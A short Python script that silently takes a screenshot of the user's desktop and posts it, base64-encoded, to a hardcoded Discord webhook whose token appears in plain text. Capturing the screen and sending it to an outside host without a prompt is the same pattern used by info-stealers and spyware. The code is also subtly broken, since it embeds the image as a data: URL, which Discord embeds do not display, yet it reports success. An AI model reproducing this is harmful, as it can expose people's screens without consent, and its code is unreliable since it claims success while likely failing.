import http.client
import json
import pyautogui
import io
import base64

def send_discord_webhook_with_screenshot(webhook_url, message):
    # Parse the webhook URL to extract the host and path
    url = webhook_url.replace("https://", "")
    host, path = url.split("/", 1)
    path = f"/{path}"

    # Take a screenshot
    screenshot = pyautogui.screenshot()

    # Save the screenshot to an in-memory buffer as a PNG
    buffer = io.BytesIO()
    screenshot.save(buffer, format="PNG")
    buffer.seek(0)

    # Encode the screenshot as base64
    encoded_screenshot = base64.b64encode(buffer.read()).decode()

    # Prepare the message data with the screenshot as an attachment
    data = {
        "content": message,
        "embeds": [
            {
                "image": {
                    "url": f"data:image/png;base64,{encoded_screenshot}"
                }
            }
        ]
    }

    # Convert the data to JSON
    json_data = json.dumps(data)

    # Create a connection to the Discord server
    connection = http.client.HTTPSConnection(host)

    # Send the POST request
    headers = {'Content-Type': 'application/json'}
    connection.request("POST", path, body=json_data, headers=headers)

    # Get the response
    response = connection.getresponse()
    if response.status == 204:
        print("Message with screenshot sent successfully!")
    else:
        print(f"Failed to send message: {response.status}, {response.reason}")

# Your Discord webhook URL
webhook_url = "https://discord.com/api/webhooks/1273704663736258654/tyiMczEmAa1IU0nOBHkrH0ahK0k-XXjR0w1KchlFxj3DAfxRxPsn7u8iOeTCOPk5VXAb"

# The message you want to send
message = "hello world"

# Send the message with screenshot
send_discord_webhook_with_screenshot(webhook_url, message)
